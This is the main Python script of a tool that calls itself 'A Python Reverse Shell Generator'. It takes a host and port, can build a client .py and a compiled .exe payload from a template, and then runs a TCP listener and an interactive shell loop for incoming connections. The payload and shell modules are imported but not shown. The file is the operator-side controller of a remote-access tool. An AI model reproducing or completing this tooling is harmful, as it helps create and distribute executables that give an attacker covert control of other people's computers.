#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
This is the main file and starting point of the program.
'''

__author__ = 'lorem.cookie'
__version__ = '0.4/alpha'

__banner__ = '''\n
--------------------------------------------------------------------------------------------------------------------
|                                                                                                                  |
|    [~~ Program by lorem.cookie ~~]                                                                               |
|                                                                                                                  |
|    [~~ Lorem_Py3 ~~]                                                                                             |
|                                                                                                                  |
|    [Options:]                                                                                                    |
|        [[REQUIERD]['--PORT' : Specify the port to server on] For example : 8060]]                                |
|        [[OPTIONAL]['--HOST' : Specify the hosts ip] For example : 127.0.0.1]]                                    |
|        [[OPTIONAL]['--BUILD' : Build client .exe and .py from SampleClient.txt]]                                 |
|                                                                                                                  |
|    [~~ Thank you for using this program <3 ~~]                                                                   |
|                                                                                                                  |
--------------------------------------------------------------------------------------------------------------------\n
'''

#Native Imports
from socket import gethostbyname, gethostname

#Not native Imports
import argparse

#Custome Imports
from modules import TCPShell
from modules import Build
from modules import logging

def main():
    
    #Parse commandline arguments
    parser = argparse.ArgumentParser(description='A Python Reverse Shell Generator') #Create parser object
    parser.add_argument('--HOST', action='store', dest='host', required=False) #Add Host argument
    parser.add_argument('--PORT', action='store', type=int, dest='port', required=True) #Add PORT argument
    parser.add_argument('--BUILD', action='store_true', dest='BUILD_IF', required=False) #Add BUILD argument
    args = parser.parse_args()
    HOST = args.host
    PORT = args.port
    BUILD_IF = args.BUILD_IF

    print(__banner__)
    
    if(HOST == None): #Check if HOST argument has been used
        
        HOST = str(gethostbyname(gethostname())) #Set HOST var to current local ip

    print('[INFO] HOST IP : {}'.format(HOST))
    
    if BUILD_IF: #Check if BUILD argument has benn used
        
        b = Build(HOST, PORT, Debug=True) #Call Build for Building client
        b.WritePy() #Write Python File
        b.CompileExe() #Compile to exe
        
    shell = TCPShell(HOST, PORT) #Call TCPSERVER class for TCP handeling
    shell.bind_shell() #Binding shell
    shell.shell_loop() #Enter Shell loop

if __name__ == "__main__":
    
    main()